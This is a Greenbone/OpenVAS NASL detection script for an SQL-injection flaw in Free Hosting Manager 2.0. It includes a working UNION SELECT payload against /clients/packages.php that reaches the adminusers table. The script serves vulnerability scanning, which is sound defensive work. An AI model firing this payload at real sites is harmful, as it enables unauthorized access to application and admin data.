if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103618" );
	script_bugtraq_id( 56754 );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:P/A:P" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Free Hosting Manager 'id' Parameter SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/56754" );
	script_xref( name: "URL", value: "http://www.fhm-script.com/index.php" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-12-04 11:39:15 +0100 (Tue, 04 Dec 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Free Hosting Manager is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data before
using it in an SQL query." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to compromise the application,
access or modify data, or exploit latent vulnerabilities in the
underlying database." );
	script_tag( name: "affected", value: "Free Hosting Manager 2.0 is vulnerable, other versions may also
be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/fhm", "/hostingmanager", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(IsMatchRegexp( buf, "<title>.*Free Hosting Manager</title>" )){
		url = dir + "/clients/packages.php?id=-1'+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,0x53514c2d496e6a656374696f6e2d54657374+from+adminusers%23";
		if(http_vuln_check( port: port, url: url, pattern: "SQL-Injection-Test" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

